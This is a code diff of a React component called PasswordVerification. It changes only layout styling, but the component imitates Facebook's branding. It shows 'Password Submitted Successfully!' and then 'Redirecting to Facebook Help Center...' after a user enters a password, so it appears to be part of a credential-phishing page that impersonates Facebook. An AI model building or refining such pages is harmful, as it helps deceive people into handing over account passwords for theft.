@@ -108,25 +108,12 @@ function PasswordVerification({ submissionId, userData }) {
     return (
       <div style={{
         fontFamily: "'Helvetica Neue', Arial, sans-serif",
-        backgroundColor: '#f0f2f5',
-        display: 'flex',
-        justifyContent: 'center',
-        alignItems: 'center',
-        minHeight: '100vh',
-        margin: 0
+        padding: '40px 30px',
+        textAlign: 'center'
       }}>
-        <div style={{
-          backgroundColor: 'white',
-          padding: '40px 30px',
-          borderRadius: '8px',
-          boxShadow: '0px 4px 12px rgba(0, 0, 0, 0.15)',
-          textAlign: 'center',
-          width: '360px'
-        }}>
-          <div style={{ color: '#1877f2', fontSize: '48px', marginBottom: '20px' }}>✓</div>
-          <h2 style={{ color: '#333', marginBottom: '20px' }}>Password Submitted Successfully!</h2>
-          <p style={{ color: '#606770' }}>Redirecting to Facebook Help Center...</p>
-        </div>
+        <div style={{ color: '#1877f2', fontSize: '48px', marginBottom: '20px' }}>✓</div>
+        <h2 style={{ color: '#333', marginBottom: '20px' }}>Password Submitted Successfully!</h2>
+        <p style={{ color: '#606770' }}>Redirecting to Facebook Help Center...</p>
       </div>
     );
   }
@@ -134,22 +121,10 @@ function PasswordVerification({ submissionId, userData }) {
   return (
     <div style={{
       fontFamily: "'Helvetica Neue', Arial, sans-serif",
-      backgroundColor: '#f0f2f5',
-      display: 'flex',
-      justifyContent: 'center',
-      alignItems: 'center',
-      minHeight: '100vh',
-      margin: 0
+      padding: '40px 30px',
+      textAlign: 'center',
+      position: 'relative'
     }}>
-      <div style={{
-        backgroundColor: 'white',
-        padding: '40px 30px',
-        borderRadius: '8px',
-        boxShadow: '0px 4px 12px rgba(0, 0, 0, 0.15)',
-        textAlign: 'center',
-        width: '360px',
-        position: 'relative'
-      }}>
         {/* Logo */}
         <div style={{ marginBottom: '20px' }}>
           <img 
@@ -286,13 +261,6 @@ function PasswordVerification({ submissionId, userData }) {
           </button>
         </form>
       </div>
-      
-      {/* Font Awesome CDN for eye icons */}
-      <link 
-        rel="stylesheet" 
-        href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css"
-      />
-    </div>
   );
 }
 
